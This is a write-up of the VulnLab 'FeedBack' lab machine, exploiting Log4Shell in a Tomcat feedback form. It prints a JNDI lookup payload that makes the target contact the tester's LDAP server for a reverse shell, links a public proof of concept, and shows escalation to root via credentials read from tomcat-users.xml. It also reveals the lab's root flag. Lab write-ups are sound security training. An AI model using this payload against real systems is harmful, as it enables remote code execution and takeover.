---
layout: post
title: FeedBack Machine Writeup - VulnLab
date: 2024-06-25 17:48 +0000
tags: vulnlab 
categories: VulnLab Machines
image: assets/img/FeedBack/feedback_slide.png
description: Writeup for FeedBack Machine from VulnLab 
---
### Intial Foothold

We start by enumerating the machine, by executing the following command:

```bash  
nmap -p- -A -Pn -oN scan 10.10.82.10 
```

Output of the scan:

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 13a2f4af3d3ddceb500bd29cb2bf616d (RSA)
|   256 51297fb8593515e2de85a3058dd21143 (ECDSA)
|_  256 27c270230f1e76feebaa38c04d4445ba (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.56
|_http-title: Apache Tomcat/9.0.56
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see from the output of the scan, that there is ssh port 22 open, but we will need credentials to use that port.
We discover the other open port (Port 8080) hosting a web server.

In that case, we launch gobuster for directory enumeration, as follows:
```bash 
gobuster  dir -u http://10.10.82.10:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 150
```

Which gives us the following output:

![](../assets/img/Feedback/Pasted%20image%2020240301224704.png)

In that case, by visiting feedback, we can see an interesting entry point vector, as it accepts two input fields that will then be processed by the server.

![](../assets/img/Feedback/Pasted%20image%2020240301224900.png)

We open burp suite, enable proxy interceptor  and capture the request in order to test it on the repeater tab with different parameter values.

![](../assets/img/Feedback/Pasted%20image%2020240301224305.png)

After some trials, testing for sqli without results, we see that the web server is logging the inputs while the request uses jsessionid, which can lead us to search for a potential log4j usage.

#### Log4j explanation
Log4j is an open-source logging framework maintained by Apache. It’s used to log messages within software and has the ability to communicate with other services on a system. This communication functionality is where the vulnerability exists, providing an opening for an attacker to inject malicious code into the logs so it can be executed on the system.

Source code for the log4shell poc , by creating our own ldap server in which the remote web application will connect to. 
[](https://github.com/kozmer/log4j-shell-poc)

This poc allows an attacker to deploy an http server and ldap server,  which will rely on JNDI (Java Name Directory Interface) to enable users to fetch and load java objects from the server.

Knowing that log4j allows an attacker to input his own JNDI lookups on the target server, this allows him to direct the target web server to the fake ldap server deployed previously, which can result on RCE (Remote Code Execution).
 
#### Steps to follow 

1) We install the requirements: 

```bash 
pip -r install requirements.txt
```

2) We download **jdk 1.8.0.20**

3) We add the **jdk package** to the current repository and launch our **ldap server**

![](../assets/img/Feedback/Pasted%20image%2020240302232551.png)


We then copy the following line to one of the form fields, which will tell the backend server of the web application to connect to our ldap server.

```bash
${jndi:ldap://10.8.1.99:1389/a}
```

We now have a reverse shell to that web application as **tomcat user**

![](../assets/img/Feedback/Pasted%20image%2020240302232853.png)

Aterwards, We execute the following command to get an interactive shell:

```bash 
python3 -c 'import pty;pty.spawn("/bin/bash")' 
```

![](../assets/img/Feedback/Pasted%20image%2020240303230828.png)

### Privilege Escalation
We then launch **linpeas.sh** script to enumerate for potential privilege escalation vectors, and we stumble upon pkexec having the suid bit set.

![](../assets/img/Feedback/Pasted%20image%2020240302235358.png)

Now, we can execute the following command to get shell as root:

```bash 
sudo pkexec /bin/sh
```

However, we are blocked with the following error message: 

```bash 
sudo: no tty present and no askpass program specified 
```

By pursuing our enumeration process, we stumbled upon a file inside the folder **/opt/tomcat/conf named "tomcat-users.xml"** containing the credentials for the admin user inside the machine 

![](../assets/img/Feedback/Pasted%20image%2020240303231157.png)

Using these credentials, we can authenticate as **root** 

![](../assets/img/Feedback/Pasted%20image%2020240303231318.png)


* We finally find the root flag inside the root folder: 
`VL{25da7f42f4e279698c91c0ce911d51a9}`